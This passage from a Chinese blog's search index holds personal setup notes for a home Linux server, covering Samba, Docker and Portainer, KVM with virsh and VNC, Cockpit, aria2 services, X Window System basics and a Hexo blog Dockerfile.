(archive.org)</li> </ul> </li> </ul> <p>fstab: Fstab - Community Help Wiki (ubuntu.com)</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#linux\u5206\u4eabsamba","title":"linux\u5206\u4eabSamba","text":"<p>https://ubuntu.com/tutorials/install-and-configure-samba#3-setting-up-samba</p> <p>Easily Install and Configure Samba File Server on Ubuntu 22.04 - kifarunix.com</p> <p>\u5b89\u88c5</p> <pre><code>sudo apt update\nsudo apt install samba\n</code></pre> <p>\u8bbe\u7f6e\u5171\u4eab\u76ee\u5f55</p> <pre><code>sudo vim /etc/samba/smb.conf\n\n[sambashare]\n    comment = Samba on Ubuntu\n    path = /home/username/sambashare\n    read only = no\n    browsable = yes\n</code></pre> <p>\u8fd0\u884c</p> <pre><code>sudo service smbd restart\n#sudo ufw allow samba\n\n#\u6dfb\u52a0\u7528\u6237\u5e76\u8bbe\u7f6e\u5bc6\u7801\nsudo smbpasswd -a username\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u547d\u4ee4\u884c\u5206\u533a","title":"\u547d\u4ee4\u884c\u5206\u533a","text":"","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#dockerportainer","title":"docker,portainer","text":"","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u5b89\u88c5docker","title":"\u5b89\u88c5docker","text":"<pre><code>#\u6dfb\u52a0\u6e90\nsudo apt-get install \\\n    apt-transport-https \\\n    ca-certificates \\\n    curl \\\n    gnupg \\\n    lsb-release\n\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg\n\necho \\\n   \"deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \\\n   $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null\n\n#\u5b89\u88c5\nsudo apt-get update\nsudo apt-get install docker-ce docker-ce-cli containerd.io\n\n#sudo groupadd docker\nsudo usermod -aG docker $USER\n\n#\u542f\u52a8\nsudo systemctl enable docker\nsudo systemctl start docker\n\n#\u6d4b\u8bd5\ndocker info\ndocker run --rm hello-world\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u5b89\u88c5portainer","title":"\u5b89\u88c5portainer","text":"<pre><code>docker volume create portainer_data\n\ndocker run -d -p 9001:8000 -p 9000:9000 --name portainer \\\n    --restart=always \\\n    -v /var/run/docker.sock:/var/run/docker.sock \\\n    -v portainer_data:/data \\\n    portainer/portainer-ce\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#kvm-cockpit","title":"KVM, cockpit","text":"","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#kvm-install","title":"KVM install","text":"<p>KVM: How to Install Kvm on Ubuntu 20.04 | Linuxize</p> <pre><code>sudo apt install qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils virtinst virt-manager\n</code></pre> <ul> <li><code>qemu-kvm</code> - software that provides hardware emulation for the KVM hypervisor.</li> <li><code>libvirt-daemon-system</code> - configuration files to run the libvirt daemon as a system service.</li> <li><code>libvirt-clients</code> - software for managing virtualization platforms.</li> <li><code>bridge-utils</code> - a set of command-line tools for configuring ethernet bridges.</li> <li><code>virtinst</code> - a set of command-line tools for creating virtual machines.</li> <li><code>virt-manager</code> - an easy-to-use GUI interface and supporting command-line utilities for managing virtual machines through libvirt.</li> </ul> <p>brctl</p> <p>The \u201cvirbr0\u201d bridge does not have any physical interfaces added. \u201cvirbr0-nic\u201d is a virtual device with no traffic routed through it. The sole purpose of this device is to avoid changing the MAC address of the \u201cvirbr0\u201d bridge.</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#kvm-install-win10","title":"KVM install win10","text":"<p>How To Install Windows 10 on Ubuntu KVM? \u2013 GetLabsDone</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#cli","title":"CLI","text":"<p>\u53c2\u8003\uff1a</p> <ul> <li>Virsh commands cheatsheet to manage KVM guest virtual machines | ComputingForGeeks</li> <li>Commands for KVM hypervisor management | Kalle's playground (wordpress.com)</li> </ul>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u57fa\u672c","title":"\u57fa\u672c","text":"<pre><code>#\u5217\u51fa\u865a\u62df\u673a(domain)\nvirsh list      #active\nvirsh list --all\n\n#\u67e5\u770b\u865a\u62df\u673a\u4fe1\u606f\nvirsh dominfo vm_name\nvirsh edit vm_name      #XML\u683c\u5f0f\n\n#\u5f00\u542f\u3001\u5173\u95ed\nvirsh start vm_name\nvirsh shutdown vm_name  \nvirsh reboot vm_name\nvirsh destroy test      #\u5f3a\u5236\u5173\u95ed\nvirsh autostart vm_name #\u8bbe\u7f6e\u81ea\u52a8\u542f\u52a8\nvirsh autostart --disable vm_name   #\u5173\u95ed\u8bbe\u7f6e\u81ea\u52a8\u542f\u52a8\n\n#\u6302\u8d77\nsudo virsh suspend test\nsudo virsh resume test\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u5f00\u542fvnc","title":"\u5f00\u542fVNC","text":"<pre><code>virsh shutdown &lt;domain-name&gt;\nvirsh edit &lt;domain-name&gt;\n\n#Add below XML contents within &lt;devices&gt; block\n&lt;graphics type='vnc' port='-1' autoport='yes' listen='0.0.0.0'&gt;\n  &lt;listen type='address' address='0.0.0.0'/&gt;\n&lt;/graphics&gt;\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#cockpit","title":"Cockpit","text":"<p>Cockpit: How to Install Cockpit Web Console on Ubuntu 20.04 Server (linuxtechi.com)</p> <p>\u4ec5\u9700</p> <pre><code>sudo apt install cockpit\nsudo systemctl start cockpit\n</code></pre> <p>\u7aef\u53e3\u4e3a9090</p> <p>\u8981\u7ba1\u7406\u865a\u62df\u673a\u9700\u8981\u5b89\u88c5</p> <pre><code>sudo apt install cockpit-machines\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#lxd","title":"LXD","text":"<p>Linux Containers - LXD - Getting started</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#lxdui","title":"LXDUI","text":"<p>AdaptiveScale/lxdui: LXDUI is a web UI for the native Linux container technology LXD/LXC (github.com)</p> <ul> <li>\u4ed3\u5e93\u63d0\u4f9b\u4e86Dockerfile\uff0c\u4f46\u662freadme\u4e2d\u6ca1\u6709\u8bf4</li> <li>\u76ee\u524d\u5b89\u88c5\u6709\u5e93\u4f9d\u8d56\u7684\u95ee\u9898\uff0c\u9700\u8981patch\u4e00\u4e2apull request</li> <li>\u5c06pull request\u5730\u5740\u6dfb\u52a0\u4e00\u4e2a.patch\u540e\u7f00\uff0c\u4fbf\u53ef\u4ee5\u4e0b\u8f7d\u4e00\u4e2apatch\u6587\u4ef6</li> <li> <p>git am pathfiel</p> </li> <li> <p>\u9ed8\u8ba4\u7528\u6237\u540d\u5bc6\u7801\uff1aadmin, admin</p> </li> </ul>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u4e2d\u6587\u8f93\u5165\u6cd5","title":"\u4e2d\u6587\u8f93\u5165\u6cd5","text":"<p>\u4f7f\u7528\u4e86\u9ed8\u8ba4ibus\u7684\u4e2d\u6587\u8f93\u5165\u6cd5\uff0cctrl-\u7a7a\u683c\u5207\u6362\u5ef6\u8fdf\u6709500ms\u6709\u70b9\u5927\u3002</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#barrier","title":"barrier","text":"<ol> <li>\u95ee\u98981</li> </ol> <p>\u76f4\u63a5\u5b89\u88c5barrier\u540e\uff0c\u8fde\u63a5\u65f6\u65e5\u5fd7\u663e\u793a\u6ca1\u6709SSL\u76f8\u5173\u7684.pem\u6587\u4ef6</p> <p>\u9700\u8981\u624b\u52a8\u751f\u6210</p> <pre><code>aaa\n</code></pre> <ol> <li>\u95ee\u98982</li> </ol> <p>barrier\u76ee\u524d\u53ea\u652f\u6301xorg\uff0c\u56e0\u6b64\u9700\u8981\u5173\u95edubuntu22.04 wayland</p> <pre><code>sudo vim /etc/gdm3/custom.conf\n\n#\u8bbe\u7f6e\nWaylandEnable=true --&gt; false\n\nsudo systemctl restart gdm3\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#aria2\u4e0b\u8f7d\u670d\u52a1\u5668","title":"aria2\u4e0b\u8f7d\u670d\u52a1\u5668","text":"<ul> <li>\u4e0b\u8f7daria2\uff1aaria2/aria2(github.com)</li> </ul> <p>windows\u5b98\u65b9github\u6709\u7f16\u8bd1\u7248\uff0clinux\u6ca1\u6709\uff0c\u53ef\u4ee5\u4eceq3aql/aria2-static-builds: aria2 static builds for GNU/Linux &amp; Windows (with OpenSSL). (github.com)\u4e0b\u8f7d</p> <ul> <li>service</li> </ul> <p>Aria2c systemd service (github.com)</p> <pre><code>[Unit]\nDescription=Aria2c download manager\nAfter=network.target\n\n[Service]\nType=simple\nUser=www-data\nExecStart=/usr/bin/aria2c --console-log-level=warn --enable-rpc --rpc-listen-all --conf-path=/etc/aria2.daemon\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <ul> <li> <p>web</p> </li> <li> <p>AriaNg</p> <ul> <li>\u53ea\u6709\u4e00\u4e2ahtmlReleases \u00b7 mayswind/AriaNg (github.com)</li> </ul> <pre><code>[Unit]\nDescription=Aria2 webUI\nAfter=syslog.target network.target\n\n[Service]\nType=simple\nWorkingDirectory=/home/yfy/app/aria2-1.36.0/AriaNg\n\nExecStart=/usr/bin/python3 -m http.server 6801\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> </li> </ul>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#gui","title":"GUI","text":"<p>install alternative Desktop Environments: How to Install and Use Another Desktop Environment on Linux (howtogeek.com)</p> <p>\u5173\u952e\u8bcd\uff1a</p> <ul> <li> <p>X windows sytem</p> </li> <li> <p>Desktop environments</p> </li> <li> <p>window manager</p> <p>system software that controls the placement and appearance of windows within a windowing system in a graphical user interface (GUI). It can be part of a desktop environment (DE) or be used standalone.</p> <p>Window managers are X clients that control the appearance and behaviour of the frames (\"windows\") where the various graphical applications are drawn. They determine the border, title bar, size, and ability to resize windows</p> <ul> <li>Stacking </li> <li>Tiling</li> <li>i3</li> </ul> </li> <li> <p>applications</p> </li> <li> <p>Display manager(login manager)</p> </li> </ul> <p>is typically a graphical user interface that is displayed at the end of the boot process in place of the default shell.</p> <ul> <li> <p>GDM \u2014 GNOME display manager.</p> </li> <li> <p>LightDM \u2014 Cross-desktop display manager, can use various front-ends written in any toolkit.</p> </li> <li> <p>**[LXD \u2014 LXDE display manager. Can be used independent of the LXDE desktop environment.</p> </li> <li> <p>SDDM \u2014 QML-based display manager and successor to KDM; recommended for Plasma and LXQt.</p> </li> </ul> <p>The X server is usually started from the X Display Manager program xdm(1) or a  similar  display  manager        program.   This  utility  is run from the system boot files and takes care of keeping the server running,        prompting for usernames and passwords, and starting up the user sessions.</p> <p>Desktop environments include basically everything you see after you log into your user account on your Linux distribution\u2019s sign-in screen. The desktop itself, desktop background, panels, menus, file manager, settings windows, and many other applications and utilities all come from a desktop environment. Even each window\u2019s titlebar is provided by an application known as a window manager that comes with the desktop environment.</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#x-windows-system","title":"X Windows System","text":"<p>man X(7)</p> <p>X server\u6709\u4e24\u79cd\u542f\u52a8\u65b9\u5f0f</p> <ul> <li>login manager</li> <li>Xinit\uff1a\u4e0d\u662f\u7ed9\u7528\u6237\u4f7f\u7528\u7684\uff0c\u800c\u662f\u7528\u4e8e\u542f\u52a8X server\u7684\u5de5\u5177</li> </ul> <pre><code> %  xrdb $HOME/.Xresources\n %  xmodmap -e \"keysym BackSpace = Delete\"\n %  mkfontdir /usr/local/lib/X11/otherfonts\n %  xset fp+ /usr/local/lib/X11/otherfonts\n %  xmodmap $HOME/.keymap.km\n %  xsetroot -solid 'rgbi:.8/.8/.8'\n %  xset b 100 400 c 50 s 1800 r on\n %  xset q\n %  twm\n %  xmag\n %  xclock -geometry 48x48-0+0 -bg blue -fg white\n %  xeyes -geometry 48x48-48+0\n %  xbiff -update 20\n %  xlsfonts '*helvetica*'\n %  xwininfo -root\n %  xdpyinfo -display joesworkstation:0\n %  xhost -joesworkstation\n %  xrefresh\n %  xwd | xwud\n %  bitmap companylogo.bm 32x32\n %  xcalc -bg blue -fg magenta\n %  xterm -geometry 80x66-0-0 -name myxterm $*\n</code></pre> <p>man Xserver(1)</p> <p>The X server is usually started from the X Display Manager program xdm(1) or a  similar  display  manager        program.   This  utility  is run from the system boot files and takes care of keeping the server running,        prompting for usernames and passwords, and starting up the user sessions.</p> <p>Installations that run more than one window system may need to use the xinit(1) utility instead of a dis\u2010        play manager.  However, xinit is to be considered a tool for building startup scripts and is not intended        for use by end users.  Site administrators are strongly urged to use a display manager,  or  build  other        interfaces for novice users.</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u5207\u6362\u684c\u9762\u73af\u5883","title":"\u5207\u6362\u684c\u9762\u73af\u5883","text":"<ul> <li>xfce: [xfce:getting-started Xfce Docs]</li> <li>How to Install and Use Another Desktop Environment on Linux (howtogeek.com)</li> </ul>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#vnc","title":"VNC","text":"<p>\u4f7f\u7528VNC\u5e76\u4e0d\u9700\u8981\u4f7f\u7528\u5230login manager</p> <p>During installation, you may be prompted to choose a default display manager for Xfce. A display manager is a program that allows you to select and log in to a desktop environment through a graphical interface. You\u2019ll only be using Xfce when you connect with a VNC client, and in these Xfce sessions you\u2019ll already be logged in as your non-root Ubuntu user. So for the purposes of this tutorial, your choice of display manager isn\u2019t pertinent. Select either one and press <code>ENTER</code>.</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#docker-nodehexo","title":"Docker node/hexo","text":"","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u76f4\u63a5\u5b89\u88c5","title":"\u76f4\u63a5\u5b89\u88c5","text":"<p>\u6559\u7a0b: https://hexo.io/zh-cn/docs/index.html</p> <p>\u9996\u5148\u9700\u8981\u5b89\u88c5node.js\u548cgit\uff0c\u7136\u540e\u5b89\u88c5hexo</p> <pre><code>npm install -g hexo-cli\n</code></pre> <p>\u5e38\u7528hexo\u547d\u4ee4</p> <pre><code>hexo init\nhexo new \"aaa\"\n\nhexo clean #\u5220\u9664public\u76ee\u5f55(html)\nhexo g      #\u751f\u6210html\nhexo s -p PORT  #\u672c\u5730server\nhexo d      #\u90e8\u7f72\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#docker\u5b89\u88c5","title":"docker\u5b89\u88c5","text":"<ol> <li>\u57fa\u4e8enode\u57fa\u672c\u955c\u50cf\uff0c\u521b\u5efa\u4e00\u4e2a\u5305\u542bhexo\u73af\u5883\u7684docker\u955c\u50cf\uff0c\u5165\u53e3\u70b9\u4e3abash</li> <li>\u8fd0\u884c\u8be5\u955c\u50cf\uff0c\u5c06blog\u76ee\u5f55\u6620\u5c04\u5230docker\u5bb9\u5668\u4e2d\uff0c\u7136\u540e\u8fdb\u884chexo\u64cd\u4f5c</li> <li>[\u53ef\u9009]\u90e8\u7f72\u65f6\u4e3a\u4e86\u907f\u514d\u8f93\u5165github\u5bc6\u7801\uff0c\u53ef\u4ee5\u5c06.ssh\u548c.gitconfig\u6620\u5c04\u5230\u5bb9\u5668\u4e2d</li> </ol>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#dockerfile","title":"dockerfile","text":"<p>\u53c2\u8003</p> <ul> <li> <p>\u522b\u4eba\u7684dockerfile\uff1a\u4f7f\u7528docker\u642d\u5efaHexo - wanf3ng's blog</p> </li> <li> <p>\u8bbe\u7f6e\u7528\u6237\uff1a\u5728docker\u4e2d\u57f7\u884chexo | Plusku@blog</p> </li> </ul> <p>\u8bf4\u660e\uff1a</p> <ul> <li>\u9ed8\u8ba4\u4e86\u7528\u6237uid=1000\u3002\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u6307\u5b9aUser node\u6765\u907f\u514d\u5bb9\u5668\u5185\u751f\u6210\u7684\u6587\u4ef6\u4e3aroot\u6240\u6709\u95ee\u9898\u3002</li> <li>\u4f7f\u7528node12.0\uff0c\u5426\u5219hexo\u8fd0\u884c\u4f1a\u5931\u8d25</li> </ul> <pre><code>FROM node:12.6.0-alpine\n\n# \u5207\u6362\u4e2d\u79d1\u5927\u6e90\nRUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories\n# \u5b89\u88c5bash git openssh\nRUN apk add bash git openssh\n\n# \u8bbe\u7f6e\u5bb9\u5668\u65f6\u533a\u4e3a\u4e0a\u6d77\uff0c\u4e0d\u7136\u53d1\u5e03\u6587\u7ae0\u7684\u65f6\u95f4\u662f\u56fd\u9645\u65f6\u95f4\uff0c\u4e5f\u5c31\u662f\u6bd4\u6211\u4eec\u665a8\u4e2a\u5c0f\u65f6\nRUN apk add tzdata &amp;&amp; cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \\\n&amp;&amp; echo \"Asia/Shanghai\" &gt; /etc/timezone \\\n&amp;&amp; apk del tzdata\n\n# \u5b89\u88c5hexo\nRUN \\ \nnpm config set registry https://registry.npm.taobao.org \\\n&amp;&amp;npm install \\\n&amp;&amp;npm install hexo-cli -g \\\n&amp;&amp; npm install hexo-server --save \\\n&amp;&amp; npm install hexo-asset-image --save \\\n&amp;&amp; npm install hexo-wordcount --save \\\n&amp;&amp; npm install hexo-generator-sitemap --save \\\n&amp;&amp; npm install hexo-generator-baidu-sitemap --save \\\n&amp;&amp; npm install hexo-deployer-git --save\n\nARG GIT_NAME\nARG GIT_EMAIL\n\nUser node\n\n# \u8bbe\u7f6egit push\u65f6\u7684\u7528\u6237\u540d\u548c\u90ae\u7bb1\nRUN \\\n    git config --global user.email \"$GIT_EMAIL\" \\\n    &amp;&amp; git config --global user.name \"$GIT_NAME\"\n\nWORKDIR /home/node/blog\n\nEXPOSE 4000\n\nENTRYPOINT [\"/bin/bash\"]\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#build\u955c\u50cf","title":"build\u955c\u50cf","text":"<pre><code>docker build -t yfy/hexo-blog\\\n    --build-arg GIT_NAME=\"Fuyan Yuan\"\\\n    --build-arg GIT_EMAIL=\"33221728+TheRainstorm@users.noreply.github.com\"\\\n    .\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u8fd0\u884c","title":"\u8fd0\u884c","text":"<pre><code>docker run -it --name hexo-blog\\\n    -p 4000:4000 \\\n    -v /home/yfy/Documents/hexo-blog:/home/node/blog/ \\\n    -v /home/yfy/.ssh:/home/node/.ssh\\\n    yfy/hexo-blog\n</code></pre> <p>\u5982\u679cblog\u4e0b\u6ca1\u6709node_modules\uff0c\u5219\u9700\u8981</p> <pre><code>npm install\n</code></pre> <p>\u4e4b\u540e\u6b63\u5e38\u4f7f\u7528hexo\u5373\u53ef</p> <p>docker\u6280\u5de7\uff1a\u8fde\u63a5\u5230\u5df2\u6709\u5bb9\u5668\u3002</p> <pre><code>docker attach CONTAINER\ndocker exec -it CONTAINER CMD\n</code></pre> <p><code>attach</code>\u547d\u4ee4\u5c06\u7ec8\u7aef\u7684\u6807\u51c6\u8f93\u5165\uff0c\u6807\u51c6\u8f93\u51fa\uff0c\u6807\u51c6\u9519\u8bef\u8fde\u63a5\u5230\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668\u3002\u5982\u679c\u5bb9\u5668\u6b63\u5728\u8fd0\u884c\u7684\u547d\u4ee4\u662fbash\uff0c\u5219exit\u540e\uff0c\u5bb9\u5668\u9000\u51fa</p> <p><code>exec</code>\u547d\u4ee4\u5728\u5bb9\u5668\u5185\u542f\u52a8\u65b0\u7684\u8fdb\u7a0b\u3002\u5e38\u89c1\u5982bash</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#docker","title":"Docker","text":"","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#network","title":"network","text":"<p>https://docs.docker.com/network/</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#host","title":"host","text":"<ul> <li>\u5bb9\u5668\u4e0d\u4f1a\u83b7\u5f97\u81ea\u5df1\u7684ip</li> <li>\u5982\u679c\u5bb9\u5668\u7ed1\u5b9a\u572880\u7aef\u53e3\uff0c\u5219\u8bbf\u95ee\u4e3b\u673aip\u768480\u7aef\u53e3\u5373\u53ef</li> <li>\u6709\u5229\u4e8e\u4f18\u5316\u6027\u80fd</li> <li>\u53ea\u5728linux\u4e0a\u652f\u6301</li> </ul> <p>\u8bbe\u7f6e\u65b9\u6cd5</p> <ul> <li>docker run</li> </ul> <pre><code>--network host\n</code></pre> <ul> <li>compose</li> </ul> <pre><code>network_mode: \"host\"\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#bridge","title":"bridge","text":"<ul> <li>\u9ed8\u8ba4bridge\u7f3a\u70b9</li> </ul> <p>If you do not specify a network using the <code>--network</code> flag, and you do specify a network driver, your container is connected to the default <code>bridge</code> network by default. Containers connected to the default <code>bridge</code> network can communicate, but only by IP address, unless they are linked using the legacy <code>--link</code> flag.</p> <ul> <li>\u81ea\u5df1\u521b\u5efanetwork</li> </ul> <pre><code>docker network create my-net\ndocker network rm my-net\n\n#\u521b\u5efa\u5bb9\u5668\u65f6\u6307\u5b9a\u7f51\u7edc\ndocker create --network\n\n#\u8fde\u63a5\u5df2\u6709\u5bb9\u5668\ndocker network connect my-net my-nginx\ndocker network disconnect my-net my-nginx\n</code></pre> <ul> <li>\u8bbe\u7f6e\u9ed8\u8ba4bridge</li> </ul> <pre><code>#daemon.json\n{\n  \"bip\": \"192.168.1.1/24\",\n  \"fixed-cidr\": \"192.168.1.0/25\",\n  \"fixed-cidr-v6\": \"2001:db8::/64\",\n  \"mtu\": 1500,\n  \"default-gateway\": \"192.168.1.254\",\n  \"default-gateway-v6\": \"2001:db8:abcd::89\",\n  \"dns\": [\"10.20.1.2\",\"10.20.1.3\"]\n}\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u81ea\u542f\u52a8","title":"\u81ea\u542f\u52a8","text":"<pre><code>docker update --restart=always\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#ipv6","title":"ipv6","text":"<p>\u53c2\u8003\uff1aHow Do I Enable IPv6 Support for Docker Containers? | Linode Questions</p> <p>If you need IPv6 support for Docker containers, you need to enable the option on the Docker daemon and reload its configuration, before creating any IPv6 networks or assigning containers IPv6 addresses.</p> <p>When you create your network, you can specify the <code>--ipv6</code> flag to enable IPv6. You can\u2019t selectively disable IPv6 support on the default <code>bridge</code> network.</p> <p>\u5f00\u542fipv6\u540e\uff0c\u9ed8\u8ba4brdige\u81ea\u52a8\u914d\u7f6e\u4e86ipv6\uff0c\u65e0\u6cd5\u5173\u95ed\uff08\u81ea\u5df1\u521b\u5efa\u7684bridge 